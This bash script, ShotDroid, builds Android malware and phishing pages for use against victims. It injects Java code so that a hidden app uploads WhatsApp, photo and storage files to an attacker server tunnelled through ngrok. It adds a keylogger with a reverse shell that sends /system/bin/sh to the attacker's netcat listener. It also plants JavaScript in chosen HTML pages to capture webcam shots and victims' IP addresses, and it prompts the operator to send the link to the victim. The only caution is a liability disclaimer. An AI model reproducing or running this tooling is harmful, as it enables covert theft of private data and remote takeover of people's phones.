#!/usr/bin/bash

#####################################################
# Coded by Kp300
# Github: https://github.com/kp300
# Facebook: www.fb.me/KaliTutorialOfficial
# Source android Keylogger: https://github.com/IceWreck/LokiBoard-Android-Keylogger
# Idea from thelinuxchoice
####################################################

##########################< Disclaimer >##########################
# Usage of ShotDroid for attacking targets without prior mutual consent is illegal.
# It's the end user's responsibility to obey all applicable local, state and federal laws.
# Developers assume no liability and are not responsible for any misuse or damage caused by this program.
##################################################################

user=$(who | awk {'print $1'})
dateformat=$(date +'%m-%d-%Y')
localhost=$(hostname -I > PHP/localhost.txt)
random_port=$(seq 1111 4444 | sort -R | head -n1)
getfiles_source="Apps_GetFiles/app/src/main/java/com/getfiles/MainActivity.java"
keylogger_source="Apps_Keylogger/app/src/main/java/com/DroidKeylogger/main/latin/settings/SettingsActivity.java"
readonly var1="<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>"
readonly var2="<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>"
readonly requirements=("curl" "php" "xterm" "ngrok" "zenity")
readonly pathsdk=1

#############

## pressed Ctrl+C
ctrl_c() {
printf "\n";rm -rf index.html;rm -rf index;rm -rf index.php;rm -rf ip.php;
rm -rf saved.php;rm -rf upload.php;rm -rf php.ini;rm -rf PHP/localhost.txt;pkill -f Keylogger/keylogger.txt;pkill -f ngrok;pkill -f php;
exit 1;}
whatsapp() {
echo '               File whatsapp = new File("/storage/emulated/0/WhatsApp");' >> $getfiles_source
echo '               List<File> wafiles = (List<File>) FileUtils.listFiles(whatsapp, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> $getfiles_source
echo '               for (File file:wafiles) {' >> $getfiles_source
echo '                   try {' >> $getfiles_source
echo '                       String dir1 = file.getCanonicalPath();' >> $getfiles_source
echo '                       uploads(dir1);' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '                   catch (Exception e) {' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '               }' >> $getfiles_source
}
pictures() {
echo '               File pictures = new File("/storage/emulated/0/Pictures");' >> $getfiles_source
echo '               List<File> pcfiles = (List<File>) FileUtils.listFiles(pictures, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> $getfiles_source
echo '               for (File file:pcfiles) {' >> $getfiles_source
echo '                   try {' >> $getfiles_source
echo '                       String dir2 = file.getCanonicalPath();' >> $getfiles_source
echo '                       uploads(dir2);' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '                   catch (Exception e) {' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '               }' >> $getfiles_source
}
downloads() {
echo '               File download = new File("/storage/emulated/0/Download");' >> $getfiles_source
echo '               List<File> dwfiles = (List<File>) FileUtils.listFiles(download, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> $getfiles_source
echo '               for (File file:dwfiles) {' >> $getfiles_source
echo '                   try {' >> $getfiles_source
echo '                       String dir3 = file.getCanonicalPath();' >> $getfiles_source
echo '                       uploads(dir3);' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '                   catch (Exception e) {' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '               }' >> $getfiles_source
}
videos() {
echo '               File videos = new File("/storage/emulated/0/Videos");' >> $getfiles_source
echo '               List<File> vdfiles = (List<File>) FileUtils.listFiles(videos, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> $getfiles_source
echo '               for (File file:vdfiles) {' >> $getfiles_source
echo '                   try {' >> $getfiles_source
echo '                       String dir4 = file.getCanonicalPath();' >> $getfiles_source
echo '                       uploads(dir4);' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '                   catch (Exception e) {' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '               }' >> $getfiles_source
}
custom() {
if [ "$custom_dir" != "" ]; then
lines=0
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ++ %s\n" $custom_dir
printf '               File custom_dir%s = new File(\"%s\");\n' $lines $custom_dir >> $getfiles_source
printf '               List<File> c_files%s = (List<File>) FileUtils.listFiles(custom_dir%s, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);\n' $lines $lines >> $getfiles_source
printf '               for (File file : c_files%s) {\n' $lines >> $getfiles_source
printf '                   try {\n' >> $getfiles_source
printf '                       String c_path%s = file.getCanonicalPath();\n' $lines >> $getfiles_source
printf '                       uploads(c_path%s);\n' $lines >> $getfiles_source
printf '                   }\n' >> $getfiles_source
printf '                   catch (Exception e) {\n' >> $getfiles_source
printf '                   }\n' >> $getfiles_source
printf '               }\n' >> $getfiles_source
let lines+=1
else
printf "\e[1;92m[\e[38;5;9m-\e[0m\e[1;92m]\e[0m\e[38;5;9m Please enter your custom directory\n"
fi
}
internal() {
echo '               File internal = new File("/storage/emulated/0");' >> $getfiles_source
echo '               List<File> internalfiles = (List<File>) FileUtils.listFiles(internal, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> $getfiles_source
echo '               for (File file:internalfiles) {' >> $getfiles_source
echo '                   try {' >> $getfiles_source
echo '                       String dir5 = file.getCanonicalPath();' >> $getfiles_source
echo '                       uploads(dir5);' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '                   catch (Exception e) {' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '               }' >> $getfiles_source
}
external() {
echo '               File external = new File("/storage/");' >> $getfiles_source
echo '               List<File> externalfiles = (List<File>) FileUtils.listFiles(external, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> $getfiles_source
echo '               for (File file:externalfiles) {' >> $getfiles_source
echo '                   try {' >> $getfiles_source
echo '                       String dir6 = file.getCanonicalPath();' >> $getfiles_source
echo '                       uploads(dir6);' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '                   catch (Exception e) {' >> $getfiles_source
echo '                   }' >> $getfiles_source
echo '               }' >> $getfiles_source
}
jsscript() {
  link_ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
############## < check & replace ngrok server > ##############
if grep -s -q link_server JS/scripts.js; then
  sed -i "s+link_server+https://$link_ngrok+g" JS/scripts.js > /dev/null 2>&1
elif grep -s -q https://.*.ngrok.io JS/scripts.js; then
  sed -i "s+https://.*.ngrok.io+https://$link_ngrok+gI" JS/scripts.js > /dev/null 2>&1
else
  sed -i "/saved.php/d" JS/scripts.js > /dev/null 2>&1; sed -i "/data: { cat: imgdata},/a\     url: 'https://$link_ngrok/saved.php'," JS/scripts.js > /dev/null 2>&1
fi

}
php_index() {
## add php scripts
echo "<?php" > index.php
echo "include 'ip.php';" >> index.php
echo "header('Location: https://$link_ngrok/index.html');" >> index.php
echo "exit" >> index.php
echo "?>" >> index.php
}

function depentacies() {
clear;printf "\e[0m\e[1;77mCheck depentacies ..................................\e[0m\n\n"
for checkrequirements in ${requirements[@]}; do
  if [[ $(which $checkrequirements) != "" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\t\e[0m\e[38;5;51m %s\e[0m\n" $checkrequirements;sleep .10
  else
    printf "\e[1;92m[\e[1;77m\e[38;5;9m-\e[0m\e[1;92m]\t\e[0m\e[38;5;9m %s\e[0m\n" $checkrequirements;sleep .10
    echo $checkrequirements >> outfile
  fi
done

if [[ -f outfile ]]; then
  catt=$(cat outfile)
  printf "\n\e[0m\e[1;77mPlease install: \e[38;5;9m%s\e[0m" $catt; rm -rf outfile; exit $?;
else
  clear;
fi
}
function ngrok_start() {
  if [[ $code -eq 1 ]]; then
    pkill -f ngrok
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Starting Ngrok..\n"
    xterm -T " Starting Ngrok " -geometry 100x25-1+0 -e "ngrok http 4444" & > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Please wait..\n"
    sleep 10;

  elif [[ $code -eq 2 ]]; then
    #statements
    pkill -f ngrok
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Starting Ngrok..\n"
    xterm -T " Starting Ngrok " -geometry 100x25-1+0 -e "ngrok tcp $port" & > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Please wait..\n"
    sleep 10;
    if [[ $(curl --silent http://127.0.0.1:4040/api/tunnels) == "" ]]; then
      printf "\n\e[0mTCP tunnels are only available after you sign up.\nSign up at: https://ngrok.com/signup\n\nIf you have already signed up, make sure your authtoken is installed.\nYour authtoken is available on your dashboard: https://dashboard.ngrok.com/auth/your-authtoken\n\nERR_NGROK_302";
      ctrl_c;
    fi

  elif [[ $code -eq 3 ]]; then
    pkill -f ngrok
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Starting Ngrok..\n"
    xterm -T " Starting Ngrok " -geometry 100x25-1+0 -e "ngrok http 4444" & > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Please wait..\n"
    sleep 10;
    link_ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
  fi

}
function php_start() {
  if [[ $PHP = 1 ]]
  then
    ############## < start php android files > ##############
    pkill -f php
    cp -rf PHP/upload.php .;
    echo "post_max_size = 800M" > php.ini
    xterm -T " Waiting Files " -geometry 100x25+1+0 -e "php -c php.ini -S 0.0.0.0:4444" & > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Starting php.."

  elif [[ $PHP = 2 ]]
  then
    ############## < start php take webcam > ##############
    pkill -f php
    cp -rf PHP/ip.php PHP/saved.php .;
    xterm -T " Starting php " -geometry 100x25+1+0 -e "php -S 0.0.0.0:4444" & > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Starting php server...\n"
    sleep 2
  else
    printf "\e[0m\e[38;5;9mCan't run php\n"
    ctrl_c
  fi
}
function web_server() {

printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[38;5;154m Localhost\n\e[0m"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[38;5;154m Ngrok\e[0m\n\n"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77m Choose a Web Server: \e[0m' host

if [[ $code -eq 1 ]]; then
  if [[ $host -eq 1 ]] || [[ $host -eq 01 ]]; then
  	for ip in $(cat PHP/localhost.txt); do
  		sed -i "/String pathToOurFile = selectedPath;/a\        String urlServer = \"http://$ip:4444/upload.php\";" $getfiles_source
  		#rm -rf PHP/localhost.txt
  	done
  elif [[ $host -eq 2 ]] || [[ $host -eq 02 ]]; then
    ngrok_start
    link_ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
    if [[ $link_ngrok != "" ]]; then
      sed -i "/String pathToOurFile = selectedPath;/a\        String urlServer = \"https://$link_ngrok/upload.php\";" $getfiles_source
    else
      printf "\n\e[0m\e[38;5;9mCan't find ngrok link in the script!"; pkill -f ngrok; ctrl_c;
    fi
  else
    ctrl_c;
  fi

elif [[ $code -eq 2 ]]; then
  if [[ $host -eq 1 ]] || [[ $host -eq 01 ]]; then
    for localhost in $(cat PHP/localhost.txt); do
        printf '\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m]\e[0m\e[1;77m Choose a Port (Default: \e[1;77m\e[38;5;154m%s\e[0m): \e[0m' $random_port;
        read port;port="${port:-${random_port}}"
        if [[ $port == "" ]]; then
          printf "        Socket socket = new Socket(\"%s\", %s);\n" $localhost $random_port  >> $keylogger_source
        else
          printf "        Socket socket = new Socket(\"%s\", %s);\n" $localhost $port  >> $keylogger_source
        fi
    done
  elif [[ $host -eq 2 ]] || [[ $host -eq 02 ]]; then
    printf '\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m]\e[0m\e[1;77m Choose a Port (Default: \e[1;77m\e[38;5;154m%s\e[0m): \e[0m' $random_port;
    read port;port="${port:-${random_port}}"
    ngrok_start
    for serverngrok in `curl --silent http://127.0.0.1:4040/api/tunnels | grep -o "[0-9].tcp.ngrok.io"`; do
      for serverport in `curl --silent http://127.0.0.1:4040/api/tunnels | sed -nE 's/command_line","*public_url":"([^"]*).*/*\1/p' | grep -o "[0-9]*$"`; do
        printf "        Socket socket = new Socket(\"%s\", %s);\n" $serverngrok $serverport >> $keylogger_source
      done
    done
  else
    exit 1;
  fi
fi
}

function getfiles_main() {
cat main/getfiles_main2 >> $getfiles_source
web_server
php_start; sleep 1;
printf "\n\n\t\e[1;77m\e[38;5;15mApp already configured. Build App/ using Android Studio.\n"
printf "\tThe App folder location is in --> \e[1;77m\e[38;5;154mDroid-GetFiles/\e[0m\n\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Waiting Files,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

if [ ! -d Files/ ]; then
  mkdir Files
fi
while [ true ]; do
  if [ -e Log.log ]; then
    printf "\e[1;77m\e[38;5;154m[\e[38;5;15m+\e[38;5;154m]\e[38;5;154m File Received!\e[0m\e[1;77m Saved: Files/\e[0m\n"
    rm -rf Log.log
  fi
done
}
function configureApp_gf() {
code=1
PHP=1
local choose_dir1=0
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m] \e[0m\e[38;5;154mWhatsApp \e[0m{/storage/emulated/0/WhatsApp}\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m] \e[0m\e[38;5;154mPictures \e[0m{/storage/emulated/0/Pictures}\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m] \e[0m\e[38;5;154mDownload \e[0m{/storage/emulated/0/Download}\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m] \e[0m\e[38;5;154mVideos   \e[0m{/storage/emulated/0/Videos}\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m] \e[0m\e[38;5;154mInternal Storage \e[0m{/storage/emulated/0/}\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m] \e[0m\e[38;5;154mExternal + Internal Storage \e[0m{/storage/}\n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m] \e[0m\e[38;5;154mCustom\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m] \e[0m\e[38;5;154mBack\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m] \e[0m\e[38;5;154mExit\e[0m\n\n"

while [[ "$choose_dir1" != "" ]]; do
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77m Choose a dir then Hit Enter to continue: \e[0m' choose_dir1
case "$choose_dir1" in
  1|01) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ++ WhatsApp\e[0m\n"; whatsapp;;
  2|02) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ++ Pictures\e[0m\n"; pictures;;
  3|03) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ++ Download\e[0m\n"; downloads;;
  4|04) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ++ Videos\e[0m\n";   videos;;
  5|05) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ++ Internal\e[0m\n"; internal;;
  6|06) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ++ External\e[0m\n"; external;;
  7|07)
    while [[ "$custom_dir" == "" ]]; do
      read -p $'\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m]\e[0m\e[1;77m Insert directory {Ex: \e[0m/storage/emulated/documents\e[0m\e[1;77m}: \e[0m' custom_dir
      custom
    done ;;
  8|08) clear; menu;;
  99) exit 0 ;;
  *)
    if ! grep -s -q /storage/ $getfiles_source
    then
      printf "\e[38;5;160mInvalid!\e[0m\n"; sleep .50; clear;
      printf "\e[1;77m\e[38;5;154m[\e[38;5;15m+\e[38;5;154m]\e[38;5;51m Android Files\e[0m\n"; configureApp_gf;
    fi ;;
esac
done
}

function keylogger_main() {

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m See logs.txt after getting shell, Run this command:\n";sleep 1
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ## tail -f Keylogger/keylogger.txt\e[0m\n";sleep 1
xterm -T " Console Shell & Keylogger " -geometry 100x30+1+0 -e "tail -f Keylogger/keylogger.txt" & > /dev/null 2>&1
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ## cat /sdcard/logs.txt\n";sleep 1

printf """\n\e[0m\e[1;77m----------------------------Build App----------------------------
      App already configured. Build App using Android Studio.
      The App folder location is in --> \e[1;77m\e[38;5;154mApps_Keylogger\e[0m
-----------------------------------------------------------------\n"""

while [[ true ]]
do
  printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Waiting Sessions,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
  nc -lvp $port >> Keylogger/keylogger.txt
  printf "\n\e[1;77m\e[0m\e[1;92m[\e[38;5;15m-\e[0m\e[1;92m]\e[0m\e[38;5;9m Exit Sessions..\n"
  read -p $'\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m]\e[0m Want to continue? [y/n]: ' continue_qs
  if [[ $continue_qs == "n" ]] || [[ $continue_qs == "N" ]] || [[ $continue_qs == "no" ]] || [[ $continue_qs == "NO" ]]; then
    ctrl_c
  fi
done
}
function configureApp_ak() {

code=2
cat main/keylogger_main1 > $keylogger_source
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Configuring App..\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Please wait..\e[0m\n"
printf "    public void getShell() throws IOException, InterruptedException {\n" >> $keylogger_source
printf '        final Process process = Runtime.getRuntime().exec("system/bin/sh");\n' >> $keylogger_source

web_server

printf "        forwardStream(socket.getInputStream(), process.getOutputStream());\n" >> $keylogger_source
printf "        forwardStream(process.getInputStream(), socket.getOutputStream());\n" >> $keylogger_source
printf "        forwardStream(process.getErrorStream(), socket.getOutputStream());\n" >> $keylogger_source
printf "        process.waitFor();\n" >> $keylogger_source
printf "        socket.getInputStream().close();\n" >> $keylogger_source
printf "        socket.getOutputStream().close();\n" >> $keylogger_source
printf "    }\n" >> $keylogger_source

cat main/keylogger_main2 >> $keylogger_source

if [[ ! -d Keylogger ]]; then
  mkdir Keylogger
fi

if [[ ! -e Keylogger/keylogger.txt ]]; then
  echo "Waiting for target logs..." > Keylogger/keylogger.txt
else
  mv Keylogger/keylogger.txt Keylogger/keylogger-"$dateformat-$random_port".txt
  echo "Waiting for target logs..." > Keylogger/keylogger.txt
fi
}

function take_webcam_main() {

php_start
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Send this link to the victim:\e[0m\e[1;77m https://%s\e[0m\n" $link_ngrok
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[1;77m\e[38;5;154m Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
if [[ ! -d webcam ]]; then
  mkdir webcam
fi

while [[ true ]]; do
  if [[ -e "ip.txt" ]]; then
    OS=$(grep -a 'User-Agent:' ip.txt | cut -d " " -f5 | tr -d '\r')
    IP=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[38;5;154m Target opened the link!"
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m OS: \e[1;77m\e[38;5;27m%s\e[0m" $OS
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Victim Public IP:\e[1;77m\e[38;5;27m %s\e[0m\n" $IP
    cat ip.txt >> webcam/webcam-ip.txt
    rm -rf ip.txt
  fi

  if [[ -e "Log.log" ]]; then
    printf " \e[1;77m\e[38;5;15m++\e[0m\e[38;5;27m Take shots webcam.\e[1;77m\e[38;5;154m saved => webcam/ \e[0m\n"
    rm -rf Log.log
  fi
done

}
function take_webcam_default() {
#link_ngrok=curl -s -N http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p'
if [[ -f PHP/index.html ]]; then
  if grep -s -q ngrok.io PHP/index.html; then
    sed -i "s+https://.*.ngrok.io+https://$link_ngrok+gI" PHP/index.html
  elif grep -s -q link_server PHP/index.html; then
    sed -i 's+link_server+'https://$link_ngrok'+g' PHP/index.html
  elif grep -s -q saved.php PHP/index.html; then
    sed -i "/saved.php/d" PHP/index.html;sed -i "/data: { cat: imgdata},/a\     url: 'https://$link_ngrok/saved.php'," PHP/index.html;
  fi
else
  printf "\e[0m\e[38;5;9m index.html is not found in directory PHP/index.html. Aborting!"; exit 1;
fi
cp PHP/index.html . > /dev/null 2>&1; sleep 1
php_index
take_webcam_main
}
function custom_html_fol() {

local find_html=$(find "$folder" -name '*.html')
if grep -s -q "<head>" "$find_html" && grep -s -q "</head>" "$find_html"; then
  rm -rf index > /dev/null 2>&1; cp -rf "$folder" ./index > /dev/null 2>&1; sleep 2;
  if [[ -d index ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Inject a script to HTML\e[0m\n"
    sed -i "/<head>/a\ $var1 \n $var2" index/$(basename -s .html "$find_html".html) > /dev/null 2>&1
  else
    printf "\e[0m\e[38;5;9m Can't move folder. Aborting!\n"; ctrl_c
  fi
else
  printf "\n%s\n\n" "$find_html"
  printf "\e[0m\e[38;5;9mI'am confused! too much .html files in %s folder.\nI need only one .html file in that folder.\nCannot be injected!" "$(basename -a $folder)"
  ctrl_c
fi

ngrok_start
jsscript
php_index
sed -i "\|</head>|r JS/scripts.js" index/$(basename -s .html "$find_html".html); sed -i "/header/d" index.php > /dev/null 2>&1
sed -i "/'ip.php';/a\header('Location: https://$link_ngrok/index/$(basename -s .html "$find_html".html)');" index.php > /dev/null 2>&1
take_webcam_main
}
function take_webcam() {
code=3
PHP=2
local custom_template=0
printf "\n\e[0m\e[1;77m--------------------< Choose Template >--------------------\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m] \e[0m\e[38;5;154mDefault HTML\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m] \e[0m\e[38;5;154mCustom HTML\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m] \e[0m\e[38;5;154mCustom Directory HTML\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m] \e[0m\e[38;5;154mBack\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m] \e[0m\e[38;5;154mExit\e[0m\n\n"

while [[ $custom_template != "" ]]; do
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77m Choose number 0/1/2 or (\e[1;77m\e[38;5;154mHit Enter to Default\e[0m): \e[0m' custom_template
case $custom_template in
  1|01) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Custom HTML\e[0m\n";
        html=$(zenity --file-filter="*.html" --file-selection --title="Choose html" --filename="/home/"$user"/")
        if [ ! -z "$html" ]; then
          if [[ -f JS/scripts.js ]]; then
            ngrok_start
            jsscript
            printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Inject a script to HTML\e[0m\n"
            printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Inject payload ngrok link to index.php\e[0m\n"
              if grep -s -q '<head>' "$html" && grep -q '</head>' "$html"; then
                sed -E "\|</head>|r JS/scripts.js" "$html" > PHP/index2.html; sed -i "/<head>/a\ $var1 \n $var2" PHP/index2.html > /dev/null 2>&1;
                php_index; mv PHP/index2.html ./index.html; take_webcam_main
              else
                printf "\e[38;5;160m[!]\e[0m\e[38;5;160m HTML cannot be injected!\n"; ctrl_c;
              fi
          else
            ctrl_c
          fi
        else
          sleep 1;clear;
          printf "\e[1;77m\e[38;5;154m[\e[38;5;15m+\e[38;5;154m]\e[38;5;51m Take Face Webcam\e[0m\n"; take_webcam;
        fi;;
  2|02) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Custom Directory\e[0m\n";
        folder=$(zenity --file-selection --directory --title="Choose source directory" --filename="/home/"$user"/")
        if [ ! -d "$folder" ]; then
          sleep 1; clear;
          printf "\e[1;77m\e[38;5;154m[\e[38;5;15m+\e[38;5;154m]\e[38;5;51m Take Face Webcam\e[0m\n"; take_webcam;
        else
          custom_html_fol
        fi;;
  3|03) clear; menu;;
  99) exit 0;;
  *)
    if [[ $custom_template -gt 3 ]]; then
      printf "\e[38;5;160mInvalid\n";sleep 1; clear;
      printf "\e[1;77m\e[38;5;154m[\e[38;5;15m+\e[38;5;154m]\e[38;5;51m Take Face Webcam\e[0m\n"; take_webcam;
    else
      printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Default\e[0m\n"; sleep 1; ngrok_start; take_webcam_default;
    fi
esac
done
}

function menu() {
printf """\e[0m\e[1;77m\e[1;93m
             ^__^
     _______/(oo)
  /(        /(__)
 \e[38;5;160m\e[5m*\e[0m\e[1;93m || w---||
   ||     ||  \033[1;32m-- \e[0m\e[1;77m< SHOTDROID > \033[1;32m--
  ---     --- By: Kp300\n
"""
printf "  \e[0m\e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not   ::\e[0m\n"
printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by SHOTDROID ::\e[0m\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Android Files\e[0m\e[38;5;51m\t{\e[38;5;154mGet files from Android directories\e[38;5;51m}\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Android Keylogger\e[0m\e[38;5;51m\t{\e[38;5;154mAndroid Keylogger And Getting a Shell\e[38;5;51m}\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Take Face Webcam\e[0m\e[38;5;51m\t{\e[38;5;154mTake shots webcam face\e[38;5;51m}\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Quit\e[0m\e[38;5;51m\t\t{\e[38;5;154mExit\e[38;5;51m}\e[0m\e[0m\n\n"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77m Choose a number 1/2/3\e[0m: ' choose_number

case $choose_number in
  1|01 )
    read -p $'\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m]\e[0m\e[1;77m Do you want to hide apps? [y/n]: ' hideApps
    cat main/getfiles_main1 > $getfiles_source;
    if [[ $hideApps == "y" ]] || [[ $hideApps == "Y" ]]; then
      if ! grep -q COMPONENT_ENABLED_STATE_DISABLED $getfiles_source; then
        echo -e "\n              PackageManager packageManager = getPackageManager();" >> $getfiles_source
        echo "              ComponentName componentName = new ComponentName(this, com.getfiles.MainActivity.class);" >> $getfiles_source
        echo -e "              packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);\n" >> $getfiles_source
      fi
    fi
    configureApp_gf; getfiles_main;;
  2|02 ) configureApp_ak; keylogger_main;;
  3|03 ) take_webcam;;
  99   ) exit 0;;
  *    ) printf "\e[38;5;160mInvalid!\e[0m\n"; sleep .50; clear; menu;;
esac
}
if [[ $(ping -c 1 -q google.com >&/dev/null; echo $?) != 0 ]]; then
  printf "\e[38;5;160mno internet connection!\nRun this script need connection..\n"; exit 1;
fi
trap ctrl_c INT
depentacies;
menu;
